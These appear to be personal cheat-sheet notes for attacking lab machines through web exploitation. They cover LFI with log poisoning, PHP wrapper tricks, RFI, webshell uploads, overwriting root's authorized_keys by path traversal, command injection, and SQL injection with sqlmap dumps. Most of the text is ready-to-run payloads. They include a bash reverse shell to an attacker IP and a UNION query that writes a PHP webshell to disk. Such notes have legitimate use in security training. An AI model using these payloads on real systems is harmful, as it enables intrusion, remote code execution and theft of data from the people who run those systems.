Most boxes will probably be web exploitation for initial foothold.

Make sure to constantly fingerprint running services and applications on the website. -- could be the source for easy wins.





LFI

If you have access to log files, try log poisoning.

1. First, curl the log file to see which header is logged in the file. == curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

2. Replace that header with this code == "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" >> "Mozilla/5.0 <?php echo system($_GET['cmd']); ?>" ALSO make sure the GET is ?page=admin.php

3. Attempt to use the command using a GET like this == /pizza/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ls -la

4. If successful, attempt encoded GET request to obtain reverse shell. Remember, php natively uses the bourne again shell so our reverse shell cmd will look a little different == bash -c "bash -i >& /dev/tcp/<yourip>/<yourport> 0>&1" OR bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4



PHP WRAPPERS

EXAMPLE USAGE. == curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

BASE64 ENCODING == curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=<ADMIN.PHP or TRY directory traversal to a different file.>

Try using the data wrapper to execute cmds. == curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" Make sure you also use urlencoding for the intended cmd.



RFI

1. check for rfi when you see an index.php?
  put this after index.php?view=C:\temp
    if blocked try view=c:temp

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"


FILE UPLOAD VULNERABILITIES

NOTE: You can find webshells in a kali directory.

Upload shell trying to bypass filters

Once file is uploaded, attempt to reach it.

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir


NON-EXECUTABLE UPLOAD VULNERABILITY

See if you can write over files like /etc/roots/ or /root/.ssh/authorized_keys

For ex, ssh keys.

Gen your keys

ssh-keygen

keys.pub

cat keys.pub > authorized_keys

Then, upload a file named ../../../../../../../../../../root/.ssh/authorized_keys


OS COMMAND INJECTION

If webpage lets you use a cmd. Attempt to escape the cmd and run others.

curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive









SQLI


mysql -u root -p'root' -h 192.168.50.16 -P 3306

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth


UNION BASED SQLI



This will tell us how many columns there are by throwing an error at the first one that doesn't exist.
' ORDER BY 1-- // == Output should look like 'Unknown column "6"' == Tells us there are 5 columns

  Following command will show which columns are displayed
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //

  Try then running this, make sure first column is null because that column is usually reserved.
' UNION SELECT null, null, database(), user(), @@version  -- //

  This command finds tables
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

  Able to run commands like this
' UNION SELECT null, username, password, description, null FROM users -- //
  
  Can also insert write a .php file with a webshell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

BASIC SQLI

find if field is vulnerable

' or 1=1 -- // 
' OR 1=1 in (SELECT * FROM users) -- //

next use sqlmap

1. use burp and copy the request to a file

2. use this command to enum dbs == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch --dbs

3. infortion_schema and performance_schema are native to sql, you want to look at the others.

4. use this command to enum lootdb == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D <lootdb> --tables

5. if you find an interesting table use this command to dump its data == sqlmap -r reset.request --level 5 --risk 3 --threads 10 -p email --batch -D <lootdb> -T <loottables> --dump 
